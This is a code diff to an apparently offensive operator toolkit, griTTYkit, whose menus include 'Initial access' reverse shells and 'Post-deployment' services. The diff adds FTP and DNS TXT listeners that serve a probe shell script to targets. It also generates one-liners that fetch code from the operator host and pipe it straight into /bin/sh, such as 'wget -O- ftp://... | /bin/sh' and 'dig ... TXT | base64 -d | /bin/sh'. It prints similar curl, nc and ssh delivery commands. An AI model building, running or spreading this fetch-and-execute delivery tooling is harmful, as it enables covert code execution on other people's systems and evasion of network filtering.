@@ -969,6 +969,9 @@ DEFAULTS = {
     "bridge_dest_port": 0,
     "GRIT_PROBE_PORT": 22207,
     "GRIT_PROBE_TFTP_PORT": 22208,
+    "GRIT_PROBE_FTP_PORT": 22209,
+    "GRIT_PROBE_DNS_PORT": 22210,
+    "GRIT_PROBE_DNS_NAME": "probe.grit",
     "GRIT_PROBE_NAME": "probe.sh",
     "operator_session_dir": str(DEFAULT_OPERATOR_SESSION_DIR),
     "server_state": str(DEFAULT_STATE_FILE),
@@ -12376,7 +12379,7 @@ def load_config(path):
     elif t == "builtin-tls":
         cfg["GRIT_RSHELL_TRANSPORT"] = "builtin"
         cfg.setdefault("GRIT_RSHELL_ENCRYPTION", "tls")
-    for key in ("ssh_listen_port", "GRIT_RSHELL_SOCAT_PORT", "GRIT_OPERATOR_REMOTE_FORWARD_PORT", "GRIT_OPERATOR_FILE_SERVICE_PORT", "bridge_listen_port", "bridge_dest_port", "GRIT_PROBE_PORT", "GRIT_PROBE_TFTP_PORT"):
+    for key in ("ssh_listen_port", "GRIT_RSHELL_SOCAT_PORT", "GRIT_OPERATOR_REMOTE_FORWARD_PORT", "GRIT_OPERATOR_FILE_SERVICE_PORT", "bridge_listen_port", "bridge_dest_port", "GRIT_PROBE_PORT", "GRIT_PROBE_TFTP_PORT", "GRIT_PROBE_FTP_PORT", "GRIT_PROBE_DNS_PORT"):
         cfg[key] = int(cfg[key])
     return cfg
 
@@ -14649,6 +14652,360 @@ def serve_probe_tftp(cfg, timeout, max_sessions=0):
     return 0
 
 
+def render_probe_ftp_command(cfg, host=None, port=None):
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
+    direct_host = operator_advertised_host(cfg, host=host)
+    direct_port = int(port or cfg.get("GRIT_PROBE_FTP_PORT", 22209))
+    url = f"ftp://{direct_host}:{direct_port}/{script_name}"
+    return f"wget -O- {shquote(url)} | /bin/sh"
+
+
+def ftp_send_line(conn, text):
+    conn.sendall((text.rstrip("\r\n") + "\r\n").encode("utf-8", errors="replace"))
+
+
+def ftp_recv_line(conn):
+    data = bytearray()
+    while len(data) < 8192:
+        chunk = conn.recv(1)
+        if not chunk:
+            break
+        data.extend(chunk)
+        if data.endswith(b"\n"):
+            break
+    return data.decode("utf-8", errors="replace").strip()
+
+
+def ftp_pasv_reply_host(host):
+    try:
+        socket.inet_aton(host)
+        return host
+    except OSError:
+        candidates = local_ips()
+        return candidates[0] if candidates else "127.0.0.1"
+
+
+def handle_probe_ftp_session(cfg, conn, addr, script_name, payload, log_dir, host):
+    remote = f"{addr[0]}:{addr[1]}"
+    data_sock = None
+    retrievals = 0
+    ftp_send_line(conn, "220 griTTYkit probe FTP ready")
+    try:
+        while not SHUTDOWN.is_set():
+            line = ftp_recv_line(conn)
+            if not line:
+                break
+            command, _, arg = line.partition(" ")
+            command = command.upper()
+            arg = arg.strip()
+            if command == "USER":
+                ftp_send_line(conn, "331 password not required")
+            elif command == "PASS":
+                ftp_send_line(conn, "230 logged in")
+            elif command == "SYST":
+                ftp_send_line(conn, "215 UNIX Type: L8")
+            elif command == "PWD":
+                ftp_send_line(conn, '257 "/"')
+            elif command == "TYPE":
+                ftp_send_line(conn, "200 type set")
+            elif command in {"CWD", "NOOP"}:
+                ftp_send_line(conn, "200 ok")
+            elif command == "SIZE":
+                name = arg.lstrip("/")
+                if name == script_name:
+                    ftp_send_line(conn, f"213 {len(payload)}")
+                else:
+                    ftp_send_line(conn, "550 file not found")
+            elif command == "PASV":
+                if data_sock:
+                    try:
+                        unregister_socket(data_sock)
+                        data_sock.close()
+                    except OSError:
+                        pass
+                data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                data_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                data_sock.bind((str(cfg.get("listen_host", "0.0.0.0")), 0))
+                data_sock.listen(1)
+                register_socket(data_sock)
+                pasv_host = ftp_pasv_reply_host(host).replace(".", ",")
+                data_port = data_sock.getsockname()[1]
+                ftp_send_line(conn, f"227 Entering Passive Mode ({pasv_host},{data_port // 256},{data_port % 256})")
+            elif command == "EPSV":
+                if data_sock:
+                    try:
+                        unregister_socket(data_sock)
+                        data_sock.close()
+                    except OSError:
+                        pass
+                data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                data_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                data_sock.bind((str(cfg.get("listen_host", "0.0.0.0")), 0))
+                data_sock.listen(1)
+                register_socket(data_sock)
+                data_port = data_sock.getsockname()[1]
+                ftp_send_line(conn, f"229 Entering Extended Passive Mode (|||{data_port}|)")
+            elif command == "RETR":
+                name = arg.lstrip("/")
+                if name != script_name:
+                    ftp_send_line(conn, "550 file not found")
+                    append_event(cfg, "probe-ftp", "probe_ftp_rejected", "warning", remote=remote, session=str(log_dir), details={
+                        "filename": name,
+                        "reason": "file-not-found",
+                    })
+                    continue
+                if not data_sock:
+                    ftp_send_line(conn, "425 use PASV first")
+                    continue
+                ftp_send_line(conn, "150 opening data connection")
+                data_sock.settimeout(5.0)
+                data_conn, data_addr = data_sock.accept()
+                with data_conn:
+                    data_conn.sendall(payload)
+                unregister_socket(data_sock)
+                data_sock.close()
+                data_sock = None
+                retrievals += 1
+                metadata = {
+                    "operation": "probe_ftp_script",
+                    "status": "served",
+                    "remote_addr": remote,
+                    "data_remote_addr": f"{data_addr[0]}:{data_addr[1]}",
+                    "script_name": script_name,
+                    "size": len(payload),
+                }
+                append_session_list_item(log_dir, "artifacts", metadata)
+                append_event(cfg, "probe-ftp", "probe_ftp_served", remote=remote, session=str(log_dir), details=metadata)
+                ftp_send_line(conn, "226 transfer complete")
+            elif command == "QUIT":
+                ftp_send_line(conn, "221 bye")
+                break
+            else:
+                ftp_send_line(conn, "502 command not implemented")
+    finally:
+        if data_sock:
+            try:
+                unregister_socket(data_sock)
+                data_sock.close()
+            except OSError:
+                pass
+    return retrievals
+
+
+def serve_probe_ftp(cfg, timeout, max_sessions=0):
+    service = "probe-ftp"
+    port = int(cfg.get("GRIT_PROBE_FTP_PORT", 22209))
+    host = operator_advertised_host(cfg)
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
+    script_text = probe_script_fn(cfg, host, int(cfg.get("GRIT_PROBE_PORT", 22207)))
+    payload = script_text.encode("utf-8")
+    target_command = render_probe_ftp_command(cfg, host=host, port=port)
+    log_dir = session_log_dir(cfg, service)
+    session_details = {
+        "port": port,
+        "protocol": "tcp",
+        "script_name": script_name,
+        "url": f"ftp://{host}:{port}/{script_name}",
+        "target_command": target_command,
+        "http_result_port": int(cfg.get("GRIT_PROBE_PORT", 22207)),
+    }
+    start_session_record(cfg, service, log_dir, details=session_details)
+    (log_dir / script_name).write_text(script_text, encoding="utf-8")
+    (log_dir / "config.json").write_text(json.dumps(cfg, indent=2) + "\n", encoding="utf-8")
+    print(f"Probe FTP listener. Binding on ftp://{cfg.get('listen_host', '0.0.0.0')}:{port}/{script_name}")
+    print(f"Probe FTP target URL: ftp://{host}:{port}/{script_name}")
+    print(f"Target command: {target_command}")
+    update_server_state(cfg, service, "starting", {"session_log": str(log_dir), **session_details})
+    sessions = 0
+    sock = None
+    bound = False
+    try:
+        sock = bind_listen_socket(cfg, service, port, 20)
+        bound = True
+        sock.settimeout(timeout)
+        update_server_state(cfg, service, "listening", {"session_log": str(log_dir), **session_details})
+        append_event(cfg, service, "service_start", session=str(log_dir), details=session_details)
+        print_candidates(cfg, port, advertised_host=host, advertised_port=port)
+        while not SHUTDOWN.is_set():
+            try:
+                conn, addr = sock.accept()
+            except socket.timeout:
+                print("timeout waiting for FTP probe request", file=sys.stderr)
+                return 1 if sessions == 0 else 0
+            with conn:
+                sessions += handle_probe_ftp_session(cfg, conn, addr, script_name, payload, log_dir, host)
+            if max_sessions > 0 and sessions >= max_sessions:
+                break
+    finally:
+        if sock:
+            unregister_socket(sock)
+            try:
+                sock.close()
+            except OSError:
+                pass
+        if bound:
+            stop_reason = current_stop_reason("complete")
+            update_server_state(cfg, service, "stopped", {
+                "session_log": str(log_dir),
+                "script_name": script_name,
+                "url": f"ftp://{host}:{port}/{script_name}",
+                "pid": "",
+                "managed_by": "",
+                "stopped_at": utc_now(),
+                "stopped_reason": stop_reason,
+            })
+            finish_session_record(cfg, service, log_dir, state="ended", exit_reason=stop_reason)
+            record_shutdown_event(cfg, service, session=log_dir)
+            append_event(cfg, service, "service_stop", session=str(log_dir), details={"port": port, "protocol": "tcp", "reason": stop_reason})
+    return 0
+
+
+def dns_parse_qname(packet, offset=12):
+    labels = []
+    pos = offset
+    while pos < len(packet):
+        length = packet[pos]
+        pos += 1
+        if length == 0:
+            return ".".join(labels), pos
+        if length & 0xC0:
+            return "", pos
+        if pos + length > len(packet):
+            return "", pos
+        labels.append(packet[pos:pos + length].decode("ascii", errors="replace"))
+        pos += length
+    return "", pos
+
+
+def dns_txt_answer_packet(query, txt_chunks, ttl=30):
+    if len(query) < 12:
+        return b""
+    qname, qend = dns_parse_qname(query)
+    if not qname or qend + 4 > len(query):
+        return b""
+    qtype = int.from_bytes(query[qend:qend + 2], "big")
+    qclass = int.from_bytes(query[qend + 2:qend + 4], "big")
+    qdcount = int.from_bytes(query[4:6], "big")
+    if qdcount < 1:
+        return b""
+    question = query[12:qend + 4]
+    answer_chunks = txt_chunks if qtype in (16, 255) and qclass in (1, 255) else []
+    header = (
+        query[:2] +
+        b"\x81\x80" +
+        b"\x00\x01" +
+        len(answer_chunks).to_bytes(2, "big") +
+        b"\x00\x00\x00\x00"
+    )
+    answers = []
+    for chunk in answer_chunks:
+        text = chunk.encode("ascii", errors="replace")[:255]
+        rdata = bytes([len(text)]) + text
+        answers.append(
+            b"\xc0\x0c" +
+            b"\x00\x10" +
+            b"\x00\x01" +
+            int(ttl).to_bytes(4, "big") +
+            len(rdata).to_bytes(2, "big") +
+            rdata
+        )
+    return header + question + b"".join(answers)
+
+
+def render_probe_dns_command(cfg, host=None, port=None):
+    dns_name = str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit")).strip().strip(".") or "probe.grit"
+    direct_host = operator_advertised_host(cfg, host=host)
+    direct_port = int(port or cfg.get("GRIT_PROBE_DNS_PORT", 22210))
+    if direct_port == 53:
+        return f"nslookup -type=TXT {shquote(dns_name)} {shquote(direct_host)} | sed -n 's/.*\"\\(.*\\)\".*/\\1/p' | tr -d '\\n' | base64 -d | /bin/sh"
+    return f"dig @{shquote(direct_host)} -p {shquote(str(direct_port))} +short TXT {shquote(dns_name)} | tr -d '\" \\n' | base64 -d | /bin/sh"
+
+
+def serve_probe_dns(cfg, timeout, max_sessions=0):
+    service = "probe-dns"
+    port = int(cfg.get("GRIT_PROBE_DNS_PORT", 22210))
+    host = operator_advertised_host(cfg)
+    dns_name = str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit")).strip().strip(".") or "probe.grit"
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
+    script_text = probe_script_fn(cfg, host, int(cfg.get("GRIT_PROBE_PORT", 22207)))
+    encoded = base64.b64encode(script_text.encode("utf-8")).decode("ascii")
+    txt_chunks = [encoded[i:i + 240] for i in range(0, len(encoded), 240)]
+    target_command = render_probe_dns_command(cfg, host=host, port=port)
+    log_dir = session_log_dir(cfg, service)
+    session_details = {
+        "port": port,
+        "protocol": "udp",
+        "dns_name": dns_name,
+        "script_name": script_name,
+        "txt_chunk_count": len(txt_chunks),
+        "target_command": target_command,
+        "http_result_port": int(cfg.get("GRIT_PROBE_PORT", 22207)),
+    }
+    start_session_record(cfg, service, log_dir, details=session_details)
+    (log_dir / script_name).write_text(script_text, encoding="utf-8")
+    (log_dir / f"{dns_name}.txt").write_text("\n".join(txt_chunks) + "\n", encoding="utf-8")
+    (log_dir / "config.json").write_text(json.dumps(cfg, indent=2) + "\n", encoding="utf-8")
+    print(f"Probe DNS listener. Binding on dns://{cfg.get('listen_host', '0.0.0.0')}:{port}/{dns_name}")
+    print(f"Probe DNS TXT name: {dns_name}")
+    print(f"Target command: {target_command}")
+    if port != 53:
+        print("DNS note: nslookup usually needs this service exposed on port 53; custom ports use the generated dig command.")
+    update_server_state(cfg, service, "starting", {"session_log": str(log_dir), **session_details})
+    sessions = 0
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((str(cfg["listen_host"]), port))
+        register_socket(sock)
+        sock.settimeout(timeout)
+        update_server_state(cfg, service, "listening", {"session_log": str(log_dir), **session_details})
+        append_event(cfg, service, "service_start", session=str(log_dir), details=session_details)
+        while not SHUTDOWN.is_set():
+            try:
+                packet, addr = sock.recvfrom(4096)
+            except socket.timeout:
+                print("timeout waiting for DNS probe request", file=sys.stderr)
+                return 1 if sessions == 0 else 0
+            qname, qend = dns_parse_qname(packet)
+            qtype = int.from_bytes(packet[qend:qend + 2], "big") if qend + 2 <= len(packet) else 0
+            remote = f"{addr[0]}:{addr[1]}"
+            chunks = txt_chunks if qname.rstrip(".").lower() == dns_name.lower() else []
+            response = dns_txt_answer_packet(packet, chunks)
+            if response:
+                sock.sendto(response, addr)
+            sessions += 1
+            metadata = {
+                "operation": "probe_dns_txt",
+                "status": "served" if chunks else "not-found",
+                "remote_addr": remote,
+                "dns_name": qname,
+                "query_type": qtype,
+                "txt_chunk_count": len(chunks),
+                "size": len(encoded) if chunks else 0,
+            }
+            append_session_list_item(log_dir, "artifacts", metadata)
+            append_event(cfg, service, "probe_dns_query", remote=remote, session=str(log_dir), details=metadata)
+            if max_sessions and sessions >= max_sessions:
+                return 0
+    except OSError as exc:
+        mark_service_error(cfg, service, exc, {"listen_host": str(cfg["listen_host"]), "port": port, "protocol": "udp"}, event_name="bind_error")
+        print(f"{service}: unable to bind UDP {cfg['listen_host']}:{port}: {exc}", file=sys.stderr)
+        raise
+    finally:
+        try:
+            unregister_socket(sock)
+            sock.close()
+        except OSError:
+            pass
+        stop_reason = SHUTDOWN_REASON or "server-exit"
+        if stop_reason != "bind_error":
+            mark_service_stopped(cfg, service, stop_reason)
+            finish_session_record(cfg, service, log_dir, state="ended", exit_reason=stop_reason)
+            record_shutdown_event(cfg, service, session=log_dir)
+            append_event(cfg, service, "service_stop", session=str(log_dir), details={"port": port, "protocol": "udp", "reason": stop_reason})
+    return 0
+
+
 def service_port(cfg, service):
     if service == "ssh":
         return int(cfg.get("ssh_listen_port", 22202))
@@ -14664,10 +15021,14 @@ def service_port(cfg, service):
         return int(cfg.get("GRIT_PROBE_PORT", 22207))
     if service == "probe-tftp":
         return int(cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
+    if service == "probe-ftp":
+        return int(cfg.get("GRIT_PROBE_FTP_PORT", 22209))
+    if service == "probe-dns":
+        return int(cfg.get("GRIT_PROBE_DNS_PORT", 22210))
     return 0
 
 
-DAEMON_SERVICE_CHOICES = ("ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp")
+DAEMON_SERVICE_CHOICES = ("ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp", "probe-ftp", "probe-dns")
 
 
 def configured_daemon_services(cfg, explicit=None):
@@ -14687,6 +15048,10 @@ def configured_daemon_services(cfg, explicit=None):
             services.append("probe")
         if yes(cfg.get("probe_tftp_enable", "no")):
             services.append("probe-tftp")
+        if yes(cfg.get("probe_ftp_enable", "no")):
+            services.append("probe-ftp")
+        if yes(cfg.get("probe_dns_enable", "no")):
+            services.append("probe-dns")
         if yes(cfg.get("rshell_enable", "no")):
             services.append(_resolve_transport(cfg, None))
     return list(dict.fromkeys(services))
@@ -14720,6 +15085,13 @@ def daemon_child_command(cfg, service):
         command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     if service == "probe-tftp":
         command.extend(["--probe-tftp-port", str(cfg.get("GRIT_PROBE_TFTP_PORT", 22208))])
+        command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-ftp":
+        command.extend(["--probe-ftp-port", str(cfg.get("GRIT_PROBE_FTP_PORT", 22209))])
+        command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-dns":
+        command.extend(["--probe-dns-port", str(cfg.get("GRIT_PROBE_DNS_PORT", 22210))])
+        command.extend(["--probe-dns-name", str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit"))])
         command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     command.extend(["--transport", service])
     command.extend(["--managed-by", "operator-daemon"])
@@ -15001,7 +15373,7 @@ def wait_service_port_released(cfg, service, pid=None, timeout=3.0):
             time.sleep(0.05)
         return not pid or not pid_alive(pid)
     deadline = time.time() + timeout
-    protocol = "udp" if service == "probe-tftp" else "tcp"
+    protocol = "udp" if service in {"probe-tftp", "probe-dns"} else "tcp"
     while time.time() < deadline:
         endpoints = listener_endpoints(port, protocol=protocol)
         if not endpoints:
@@ -15052,10 +15424,10 @@ def port_listening(host, port, protocol="tcp"):
 def raw_service_snapshot(cfg):
     state = read_json_file(state_file_path(cfg), {"schema": 1, "services": {}})
     services = {}
-    for name in ("ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp"):
+    for name in ("ssh", "tls-shell", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp", "probe-ftp", "probe-dns"):
         port = service_port(cfg, name)
         bind_address = str(cfg.get("listen_host", ""))
-        protocol = "udp" if name == "probe-tftp" else "tcp"
+        protocol = "udp" if name in {"probe-tftp", "probe-dns"} else "tcp"
         endpoints = listener_endpoints(port, protocol=protocol)
         matching_endpoints = [
             endpoint for endpoint in endpoints
@@ -20933,6 +21305,13 @@ def service_start_headless_command(cfg, service, argv_extra=None):
     if service == "probe-tftp":
         parts.extend(["--probe-tftp-port", str(cfg.get("GRIT_PROBE_TFTP_PORT", 22208))])
         parts.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-ftp":
+        parts.extend(["--probe-ftp-port", str(cfg.get("GRIT_PROBE_FTP_PORT", 22209))])
+        parts.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-dns":
+        parts.extend(["--probe-dns-port", str(cfg.get("GRIT_PROBE_DNS_PORT", 22210))])
+        parts.extend(["--probe-dns-name", str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit"))])
+        parts.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     if argv_extra:
         parts.extend(str(item) for item in argv_extra)
     return " ".join(shquote(part) for part in parts)
@@ -20972,6 +21351,10 @@ def start_service_process(cfg, service, argv_extra=None, headless_command=""):
         cmd.extend(["--probe-port", str(cfg.get("GRIT_PROBE_PORT", 22207)), "--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     if service == "probe-tftp":
         cmd.extend(["--probe-tftp-port", str(cfg.get("GRIT_PROBE_TFTP_PORT", 22208)), "--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-ftp":
+        cmd.extend(["--probe-ftp-port", str(cfg.get("GRIT_PROBE_FTP_PORT", 22209)), "--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
+    if service == "probe-dns":
+        cmd.extend(["--probe-dns-port", str(cfg.get("GRIT_PROBE_DNS_PORT", 22210)), "--probe-dns-name", str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit")), "--probe-name", str(cfg.get("GRIT_PROBE_NAME", "probe.sh"))])
     if argv_extra:
         cmd.extend(argv_extra)
     log_root = Path(str(cfg.get("session_root", "local/sessions")))
@@ -23098,7 +23481,7 @@ def run_line_tui(cfg):
             port = rec.get("port") or "-" if rec else "-"
             pid = rec.get("pid") or "-" if rec else "-"
             print(f"  {service}  —  {actual}  |  :{port}  |  pid {pid}")
-            if service in {"probe", "probe-tftp"}:
+            if service in {"probe", "probe-tftp", "probe-ftp", "probe-dns"}:
                 _print_probe_delivery()
             else:
                 print("    options / start / stop / back")
@@ -23331,12 +23714,26 @@ def run_line_tui(cfg):
         "probe": [
             ("GRIT_PROBE_PORT",                    "GRIT_PROBE_PORT",                 "probe HTTP listen port"),
             ("GRIT_PROBE_TFTP_PORT",               "GRIT_PROBE_TFTP_PORT",            "probe TFTP UDP listen port"),
+            ("GRIT_PROBE_FTP_PORT",                "GRIT_PROBE_FTP_PORT",             "probe FTP listen port"),
+            ("GRIT_PROBE_DNS_PORT",                "GRIT_PROBE_DNS_PORT",             "probe DNS UDP listen port"),
+            ("GRIT_PROBE_DNS_NAME",                "GRIT_PROBE_DNS_NAME",             "probe DNS TXT query name"),
             ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP used in probe command"),
         ],
         "probe-tftp": [
             ("GRIT_PROBE_TFTP_PORT",               "GRIT_PROBE_TFTP_PORT",            "probe TFTP UDP listen port"),
             ("GRIT_PROBE_PORT",                    "GRIT_PROBE_PORT",                 "probe HTTP result upload port embedded in probe.sh"),
             ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP used in TFTP command"),
+        ],
+        "probe-ftp": [
+            ("GRIT_PROBE_FTP_PORT",                "GRIT_PROBE_FTP_PORT",             "probe FTP listen port"),
+            ("GRIT_PROBE_PORT",                    "GRIT_PROBE_PORT",                 "probe HTTP result upload port embedded in probe.sh"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP used in FTP command"),
+        ],
+        "probe-dns": [
+            ("GRIT_PROBE_DNS_PORT",                "GRIT_PROBE_DNS_PORT",             "probe DNS UDP listen port"),
+            ("GRIT_PROBE_DNS_NAME",                "GRIT_PROBE_DNS_NAME",             "probe DNS TXT query name"),
+            ("GRIT_PROBE_PORT",                    "GRIT_PROBE_PORT",                 "probe HTTP result upload port embedded in probe.sh"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP used in DNS command"),
         ],
     }
     # Reverse lookup: grit env name → cfg_key (for use in set_line_option)
@@ -23857,7 +24254,7 @@ def run_line_tui(cfg):
         print(f"config_path={rec.get('config_path', build_config_path(cfg))}")
 
     LINE_SERVICE_CATEGORIES = [
-        ("Probe & discovery",  ["probe", "probe-tftp", "bridge"]),
+        ("Probe & discovery",  ["probe", "probe-tftp", "probe-ftp", "probe-dns", "bridge"]),
         ("Initial access",     ["ssh", "tls-shell", "plain-shell"]),
         ("Post-deployment",    ["file-service", "command-queue"]),
     ]
@@ -23867,6 +24264,8 @@ def run_line_tui(cfg):
     LINE_SERVICE_ALIASES = {
         "probe-http": "probe",
         "http-probe": "probe",
+        "ftp-probe": "probe-ftp",
+        "dns-probe": "probe-dns",
     }
 
     def line_service_display_name(name):
@@ -24213,6 +24612,8 @@ def run_line_tui(cfg):
         url = f"http://{route_host}:{route_port}/{script_name}"
         curl_cmd = f"curl -fsSL {shquote(url)} | /bin/sh"
         tftp_cmd = render_probe_tftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
+        ftp_cmd = render_probe_ftp_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_FTP_PORT", 22209))
+        dns_cmd = render_probe_dns_command(cfg, host=route_host, port=cfg.get("GRIT_PROBE_DNS_PORT", 22210))
         nc_cmd = (
             "printf 'GET /"
             + script_name.replace("'", "")
@@ -24230,13 +24631,15 @@ def run_line_tui(cfg):
         print(f"    wget:  {wget_cmd}")
         print(f"    curl:  {curl_cmd}")
         print(f"    tftp:  {tftp_cmd}")
+        print(f"    ftp:   {ftp_cmd}")
+        print(f"    dns:   {dns_cmd}")
         print(f"    nc:    {nc_cmd}")
         print(f"    ssh:   ssh root@target '{wget_cmd}'")
         print(f"    copy:  scp <(curl -s {shquote(url)}) root@target:/tmp/probe.sh && ssh root@target 'sh /tmp/probe.sh'")
         print("    paste: probe paste")
         print("")
-        print("  Current listeners: probe-http, probe-tftp")
-        print("  Not yet served here: probe-ftp, probe-dns")
+        print("  Current listeners: probe-http, probe-tftp, probe-ftp, probe-dns")
+        print("  DNS note: nslookup usually needs DNS exposed on port 53; dig can use custom ports.")
         print("  If HTTP is blocked but nc works, use the nc command above against the same listener.")
         print("  If the target only has a serial/admin shell, use: probe paste")
         print("")
@@ -24265,7 +24668,7 @@ def run_line_tui(cfg):
         cfg["_service_start_command"] = headless
         start_service_process(cfg, service, headless_command=headless)
         print("  copy start  — copy the headless start command")
-        if service in {"probe", "probe-tftp"}:
+        if service in {"probe", "probe-tftp", "probe-ftp", "probe-dns"}:
             # Brief poll for the listener to be ready, then show delivery commands
             for _ in range(10):
                 time.sleep(0.1)
@@ -30454,6 +30857,8 @@ Common operator workflows:
   --transport bridge --bridge-profile NAME
   --transport probe
   --transport probe-tftp
+  --transport probe-ftp
+  --transport probe-dns
 
 Interactive console:
   --tui opens the full-screen curses workbench for targets, mailbox work, files, bridges,
@@ -30522,6 +30927,7 @@ Operations:
                                 show or queue a target-to-operator upload command
   probe [--start|--queue], probe delivery, probe paste
                                 show, serve, queue, or print probe delivery commands
+                                listeners: probe-http, probe-tftp, probe-ftp, probe-dns
   downloads                     list target-fetchable staged files
   unstage NAME                  remove a staged file request
   view PATH, cat PATH           view a local session/artifact path
@@ -30581,6 +30987,8 @@ Transport modes:
   bridge      — Explicit TCP bridge from a local listener to a configured host:port
   probe — Serve a /bin/sh probe script over HTTP and receive its result
   probe-tftp — Serve the same probe script over UDP TFTP for first-contact fallback
+  probe-ftp — Serve the same probe script over simple FTP RETR
+  probe-dns — Serve the same probe script as DNS TXT chunks
 
 File staging:
   --transport file-service --serve-file ./tool --as /tmp/tool
@@ -30618,7 +31026,7 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
                         help="griTTYkit shell build config used by scripts/menuconfig and make package")
     parser.add_argument("--transport",
                         choices=("ssh", "ssh-reverse", "tls-shell", "socat-tls",
-                                 "builtin-tls", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp"),
+                                 "builtin-tls", "plain-shell", "file-service", "command-queue", "bridge", "probe", "probe-tftp", "probe-ftp", "probe-dns"),
                         help="transport to listen for (overrides config)")
     parser.add_argument("--file-service", action="store_true",
                         help="receive target-initiated file uploads and store them under local/sessions")
@@ -30831,6 +31239,12 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
                         help="probe HTTP listener port")
     parser.add_argument("--probe-tftp-port", type=int,
                         help="probe TFTP UDP listener port")
+    parser.add_argument("--probe-ftp-port", type=int,
+                        help="probe FTP listener port")
+    parser.add_argument("--probe-dns-port", type=int,
+                        help="probe DNS UDP listener port")
+    parser.add_argument("--probe-dns-name",
+                        help="probe DNS TXT query name, default probe.grit")
     parser.add_argument("--probe-name",
                         help="probe script filename, default probe.sh")
     parser.add_argument("--file-service-tls", choices=("yes", "no"),
@@ -30892,6 +31306,12 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
         cfg["GRIT_PROBE_PORT"] = args.probe_port
     if args.probe_tftp_port:
         cfg["GRIT_PROBE_TFTP_PORT"] = args.probe_tftp_port
+    if args.probe_ftp_port:
+        cfg["GRIT_PROBE_FTP_PORT"] = args.probe_ftp_port
+    if args.probe_dns_port:
+        cfg["GRIT_PROBE_DNS_PORT"] = args.probe_dns_port
+    if args.probe_dns_name:
+        cfg["GRIT_PROBE_DNS_NAME"] = args.probe_dns_name
     if args.probe_name:
         cfg["GRIT_PROBE_NAME"] = args.probe_name
     if args.file_service_tls:
@@ -31244,6 +31664,10 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
             return serve_probe(cfg, timeout, max_sessions=1 if args.one_shot else 0)
         if action == "probe-tftp":
             return serve_probe_tftp(cfg, timeout, max_sessions=1 if args.one_shot else 0)
+        if action == "probe-ftp":
+            return serve_probe_ftp(cfg, timeout, max_sessions=1 if args.one_shot else 0)
+        if action == "probe-dns":
+            return serve_probe_dns(cfg, timeout, max_sessions=1 if args.one_shot else 0)
     except KeyboardInterrupt:
         print("grit-console: interrupted, shutting down", file=sys.stderr)
         request_shutdown("keyboard_interrupt")
